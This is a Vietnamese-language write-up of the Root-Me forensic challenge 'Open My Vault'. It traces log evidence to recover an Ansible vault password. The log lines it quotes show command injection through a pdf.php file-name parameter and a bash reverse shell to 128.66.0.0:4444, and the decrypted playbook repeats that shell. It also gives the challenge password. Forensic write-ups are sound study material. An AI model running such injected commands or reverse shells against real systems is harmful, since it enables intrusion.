# Open My Vault

Challenge: https://www.root-me.org/en/Challenges/Forensic/Open-My-Vault

Sau khi ssh vào server, ta kiểm tra history của user:

```bash
    1  id
    2  cat /etc/passwd
    3  pwd
    4  cd /home/m4st3r/
    5  ping 128.66.0.0
    6  cat /etc/shadow
    7  l
    8  ll
    9  cd ansible/
   10  ls -lah
   11  tree .
   12  cat inventory.cfg
   13  cat playbook.yml
   14  cat roles/zip/tasks/main.yml
   15  mkdir roles/other
   16  mkdir roles/other/tasks
   17  ansible-vault -h
   18  ansible-vault create roles/other/tasks/main.yml
   19  vim playbook.yml
   20  ansible-playbook -h
   21  ansible-playbook -i inventory.cfg --vault-password-file=/tmp/.secure playbook.yml
   22  rm /tmp/.secure
```

Ở dòng 21, m4st3r đã chạy một playbook đã mã hóa với password nằm ở `/tmp/.secure` và sau đó anh ấy đã xóa nó với `rm /tmp/.secure`

Thử chạy lại dòng 21, kết quả trả về là không thể vì thiếu ssh-key

Giờ thì check thử `/var/log` ta có:

```bash
ll /var/log/
total 712
drwxr-xr-x 1 root root              4096 Dec  4 11:53 ./
drwxr-xr-x 1 root root              4096 Dec  4 11:53 ../
-rw-r--r-- 1 root root             13764 Dec  4 11:56 alternatives.log
drwxr-xr-x 1 root adm               4096 Dec  4 12:05 apache2/
drwxr-xr-x 1 root root              4096 Dec  4 11:53 apt/
-rw-r--r-- 1 root root             58592 Sep 22 16:47 bootstrap.log
-rw-rw---- 1 root utmp                 0 Sep 22 16:47 btmp
-rw-r--r-- 1 root root            284658 Dec  4 11:56 dpkg.log
-rw-r--r-- 1 root root             32032 Dec  4 12:05 faillog
drwxr-sr-x 2 root systemd-journal   4096 Dec  4 11:53 journal/
-rw-rw-r-- 1 root utmp            292292 Dec 11 08:17 lastlog
drwx------ 2 root root              4096 Dec  4 11:53 private/
-rw-rw-r-- 1 root utmp               384 Dec 11 08:17 wtmp
```

Okay, giờ thì check log theo thứ tự ưu tiên là syslog -> weblog. Đúng là anh ấy đã quên xóa log. Ở `/var/log/apache2/access.log` ta tìm được thứ này:

```bash
203.0.113.0 - - [03/Sep/2022:13:34:31 +0200] "GET /pdf.php?name=a.pdf;echo%20%22C4tXk9ctpG9QEMeL%22%20%3E%20/tmp/.secure HTTP/1.1" 200 31 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
203.0.113.0 - - [03/Sep/2022:13:34:57 +0200] "GET /pdf.php?name=a.pdf;bash%20-i%20%3E&%20/dev/tcp/128.66.0.0/4444%200%3E&1 HTTP/1.1" 200 31 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
```

Thứ này giống như website đã bị chèn shell. Decode với URL decode ta được:

```bash
echo "C4tXk9ctpG9QEMeL" > /tmp/.secure
bash -i >& /dev/tcp/128.66.0.0/4444 0>&1
```

Vậy là ta đã tìm được `.secure` password của vault. Giờ thì decrypt nó :

```bash
echo "C4tXk9ctpG9QEMeL" > /tmp/.secure
ansible-vault decrypt --vault-pass-file /tmp/.secure roles/other/tasks/main.yml
Decryption successful
...
cat roles/other/tasks/main.yml
- name: "hack the planet"
  ansible.builtin.shell: "bash -i >& /dev/tcp/128.66.0.0/4444 0>&1"

- name: "If someone search for a Flag ^^"
  ansible.builtin.shell: "echo '************' > /flag"
```

^^
